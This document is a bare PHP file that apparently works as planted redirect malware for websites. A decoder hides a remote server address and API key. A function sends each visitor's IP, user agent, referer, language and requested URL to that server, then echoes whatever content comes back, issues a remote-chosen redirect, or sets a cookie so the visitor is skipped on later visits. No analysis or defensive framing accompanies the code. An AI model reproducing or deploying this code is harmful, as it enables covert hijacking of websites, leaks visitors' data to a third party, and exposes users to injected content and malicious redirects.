<?php

function de($string, $key) {
    $result = '';
    $string = base64_decode($string);

    for($i = 0; $i < strlen($string); $i++) {
    	$char = substr($string, $i, 1);
    	$keychar = substr($key, ($i % strlen($key))-1, 1);
    	$char = chr(ord($char) - ord($keychar));
    	$result .= $char;
    }

    return $result;
}

function getredir($group, $key, $subid, $liver, $filelinks)
{
	$k = 'gfdKhj45dfskl';
	$ua = urlencode($_SERVER['HTTP_USER_AGENT']);
	$ip = $_SERVER['REMOTE_ADDR'];
	//$dns_lookup = gethostbyaddr($ip);
	$dns_lookup = 'nodnstest';
	if (isset($_SERVER['HTTP_REFERER'])){
		$se_ref = $_SERVER['HTTP_REFERER'];
	}
	else {
		$se_ref = '';
	}

	if (isset($_COOKIE['ch1c'])) return;


	$ref = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	$source = $_SERVER['HTTP_HOST'];
	$lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'];
	$api = '1Nva1IWXmZuW0M/hzOPI1Mt9ls2jopPH49Sa187Uig==';
	$apikey = 'zpuaxn+bnZdunZvXzp6YysavnKOZaJ2Zqp7PnZyUfsk=';
	$churl = de($api, $k) . "action=get_link&api_key=" . de($apikey, $k) . "&group=".$group."&ua=".$ua."&ip=".$ip."&keyword=".$key."&se_referer=".$se_ref."&lang=".$lang."&subid2=".$subid."&source=".$source."&referer=".$ref."&dns_lookup=".$dns_lookup."&liver=".$liver."&filelinks=".$filelinks."&charset=utf-8";
	$check = file_get_contents($churl);
	$json = json_decode($check);

	// print_r($json);

    if (isset($json->{'bot_action'})){
    	if (!isset($_COOKIE['ch1c'])) setcookie('ch1c', 'b');
		return;
	}
	elseif (stripos($json->{'redirect'}->{'type'}, 'custom') === 0){
		echo $json->{'redirect'}->{'content'};
		exit;
	}
	elseif ($json->{'redirect'}->{'type'} == 'location'){
		header($json->{'redirect'}->{'headers'}[0]);
		exit;
	}
	elseif ($json->{'redirect'}->{'type'} == 'echo'){
    	if (!isset($_COOKIE['ch1c'])) setcookie('ch1c', 'b');
		return;
	}
}
?>